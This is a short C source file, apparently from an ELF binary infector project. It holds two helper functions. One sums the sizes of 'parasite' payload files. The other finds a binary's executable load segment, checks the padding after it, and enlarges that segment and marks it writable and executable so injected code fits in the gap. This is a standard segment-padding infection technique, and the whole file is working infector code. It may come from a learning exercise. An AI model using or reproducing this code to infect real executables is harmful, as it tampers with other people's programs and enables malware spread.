#include "elf.h"

void calcul_payload(char **paths, t_elf_data *elf_data)
{
    int verif = 0;
    for (int i = 0; paths[i]; i++)
    {
        int fd = open(paths[i], O_RDONLY);
        if(fd == -1)
        {
            printf("Error, the source assembly file is not accesible\n");
            return ;
        }
        verif = (int64_t)lseek(fd, 0, SEEK_END);
        if(verif == -1)
        {
            close(fd);
            printf("Error, lseek function return an error\n");
            return ;
        }
        if(i == 0)
            elf_data->g_parasite_size = verif;
        elf_data->g_payload_size += verif;
        close(fd);
    }
    return ;
}

void init_segment_value(Elf64_Phdr *phdr, Elf64_Ehdr *eh, t_elf_data *elf_data)
{
    uint64_t padding = 0;
    uint64_t seg_size = 0;
    Elf64_Addr seg_addr = 0;
    Elf64_Off seg_offset = 0;
    for(uint16_t i = 0; i < eh->e_phnum; i++)
    { 
        if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_X))
        {
            seg_size = phdr[i].p_filesz;
            seg_addr = phdr[i].p_vaddr;
            seg_offset = phdr[i].p_offset;

            if(i + 1 < eh->e_phnum)
                padding = phdr[i + 1].p_offset - (seg_offset + seg_size);
            if(padding < elf_data->g_payload_size)
                return(error(ERROR_INJ));
            else
            {
                printf("Ajusting the size to fill\n");
                phdr[i].p_filesz += elf_data->g_payload_size;
                phdr[i].p_memsz += elf_data->g_payload_size;
                phdr[i].p_flags = PF_W | PF_R | PF_X;
            }
            break;
        }
    }
    elf_data->g_parasite_addr = seg_addr + seg_size;
    elf_data->g_parasite_off = seg_offset + seg_size;
    elf_data->g_handler_addr = elf_data->g_parasite_addr + elf_data->g_parasite_size;
    elf_data->g_handler_off = elf_data->g_parasite_off + elf_data->g_parasite_size;
    return;
}
